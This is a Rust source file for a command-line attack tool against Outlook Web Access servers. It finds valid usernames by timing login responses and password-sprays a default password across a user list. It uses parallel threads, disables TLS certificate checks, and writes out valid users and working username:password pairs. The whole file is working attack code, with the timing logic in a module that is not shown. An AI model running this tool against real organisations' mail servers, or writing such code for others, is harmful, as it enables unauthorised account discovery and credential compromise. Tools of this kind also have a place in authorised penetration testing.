mod owa;

use std::fs::File;
use std::io::{self, BufRead, BufReader, Write};
use std::sync::{Arc, Mutex};
use owa_enum::{Color, err, log, msg};
use reqwest::blocking::{Client};
use rayon::ThreadPoolBuilder;
use rayon::prelude::*;
use clap::Parser;

#[derive(Parser, Debug)]
struct Args {
    /// Target to attack
    #[arg(short, long)]
    target: String,

    /// Username to check or file containing usernames
    #[arg(short, long)]
    user: String,

    /// Password to use for authentication
    #[arg(short, long, default_value_t = String::from("Azerty@123"))]
    password: String,

    /// Target domain (optional) to connect with
    #[arg(short, long)]
    domain: Option<String>,

    /// Timeout to use for considering user does not exists
    #[arg(long)]
    timeout: Option<f64>,

    /// The number of thread to use
    #[arg(long, default_value_t = 4)]
    threads_number: usize,

    /// Output valid users to a file
    #[arg(short, long)]
    output: Option<String>,
}

fn get_users(path: &str) -> io::Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);

    reader.lines().collect()
}

fn main() {
    let args = Args::parse();

    let pool = ThreadPoolBuilder::new()
                .num_threads(args.threads_number)
                .build()
                .expect("Failed to build thread pool");

    msg!("Using {} threads", Color::wrap(args.threads_number.to_string().as_str(), Color::YELLOW));

    let filename = args.output.unwrap_or("".to_string());
    let mut file_writer: Arc<Mutex<Option<File>>> = Arc::new(Mutex::new(None));
    if ! filename.is_empty() {
        file_writer = Arc::new(Mutex::new(Some(File::create(filename).expect("Cannot create a file"))));
    }

    let mut target = args.target;
    let mut users: Vec<String> = vec![(&args.user).to_string()];

    if !target.starts_with("http") {
        target = format!("https://{}", target);
    }

    msg!("Attacking {}", Color::wrap(&target, Color::BOLD));

    if let Ok(user_list) = get_users(&users[0]) {
        users = user_list;
        msg!("Checking on {} users", users.len());
    } else {
        msg!("Checking on single user: {}", Color::wrap(&users[0], Color::BOLD));
    }

    let client_no_timeout = Client::builder().danger_accept_invalid_certs(true)
                                  .timeout(std::time::Duration::from_secs(15))
                                  .redirect(reqwest::redirect::Policy::none())
                                  .build().expect("Help, cannot create a HTTP Client");

    let mut owa_enumerator = owa::utils::Owa::new(client_no_timeout, target, args.domain);
    let owa_auth: owa::utils::OwaAuthMethod = owa_enumerator.get_auth_method();

    if owa_auth == owa::utils::OwaAuthMethod::Unknown {
        err!("Unknown auth mode, are you sure the target is an OWA");
        return ();
    } else if owa_auth != owa::utils::OwaAuthMethod::Form {
        err!("Auth {} not supported", owa_auth);
        return ();
    }
    log!("Auth method in use: {}", Color::wrap(&owa_auth.to_string(), Color::YELLOW));

    match owa_enumerator.get_domain_name(){
        Ok(()) => msg!("Domain name {}", Color::wrap(&owa_enumerator.get_domain(), Color::CYAN)),
        Err(e) => {
            err!("Got {}", e);
            return ();
        }
    }

    let timeout_to_use: f64;
    match args.timeout {
        Some(timeout) => {
            timeout_to_use = timeout;
        }
        None => {
            log!("No timeout provided, calculating one");
            let timeout = owa_enumerator.get_timeout_owa().as_secs_f64();
            log!("Timeout for non existing user: {}{:.3}{} s",
                                                 Color::YELLOW,
                                                 timeout,
                                                 Color::RESET);
            timeout_to_use = timeout / 2.0;
        }
    }

    let client = Client::builder().danger_accept_invalid_certs(true)
                                  .timeout(std::time::Duration::from_secs_f64(timeout_to_use))
                                  .redirect(reqwest::redirect::Policy::none())
                                  .build().expect("Help, cannot create a HTTP Client");
    owa_enumerator.set_client(client);

    let writer_clone = Arc::clone(&file_writer);
    pool.install(|| {
        users.par_iter().for_each( |username| {
            match owa_enumerator.user_exists(&username, args.password.as_ref()) {
                (owa::utils::OwaResult::PasswordValid, time) => {
                    msg!("User {}:{} is valid [{}{:.3}{} s]",
                         Color::wrap(&username, Color::CYAN),
                         Color::wrap(args.password.as_ref(), Color::CYAN),
                         Color::YELLOW,
                         time.as_secs_f64(),
                         Color::RESET);
                    let mut guard = writer_clone.lock().expect("Error locking file");
                    if let Some(writer) = guard.as_mut() {
                        writer.write_all(format!("{}:{}\n", username, args.password).as_bytes()).expect("Could not write to file");
                        writer.flush().unwrap();
                    }
                }
                (owa::utils::OwaResult::UserExists, time) => {
                    msg!("User {} exists [{}{:.3}{} s]",
                         Color::wrap(&username, Color::CYAN),
                         Color::YELLOW,
                         time.as_secs_f64(),
                         Color::RESET);
                    let mut guard = writer_clone.lock().expect("Error locking file");
                    if let Some(writer) = guard.as_mut() {
                        writer.write_all(format!("{}\n", username).as_bytes()).expect("Could not write to file");
                        writer.flush().unwrap();
                    }
                }
                (owa::utils::OwaResult::UserNotFound, time) => err!("User {} does not exists [{}{:.3}{} s]",
                                                                    Color::wrap(&username, Color::BOLD),
                                                                    Color::YELLOW,
                                                                    time.as_secs_f64(),
                                                                    Color::RESET),
            }
        })
    });

    // let final_result = buffer.lock().unwrap();
    // if let Some(output) = args.output {
    //     if ! final_result.is_empty(){
    //         log!("Writting result to: {}", output);
    //         let mut file = File::create(output).expect("Failed to create file");
    //         file.write_all(final_result.as_bytes()).expect("Could not write result");
    //     }
    // }
}
